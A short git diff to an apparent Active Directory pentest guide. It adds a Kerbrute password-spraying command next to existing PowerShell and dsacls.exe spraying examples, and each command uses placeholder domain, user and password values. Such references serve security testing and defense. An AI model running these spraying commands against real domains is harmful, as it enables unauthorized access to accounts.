@@ -66,6 +66,9 @@ Invoke-DomainPasswordSpray -Password $password
 
 # From a domain joined computer using dsacls.exe built-in binary.
 dsacls.exe "$distinguishedname" /user:$username@$domain /passwd:$password
+
+# From a domain joined computer using Kerbrute.
+./Kerbrute.exe passwordspray -d $domain usernames.txt $password
 ```
 
 ## Recommendations
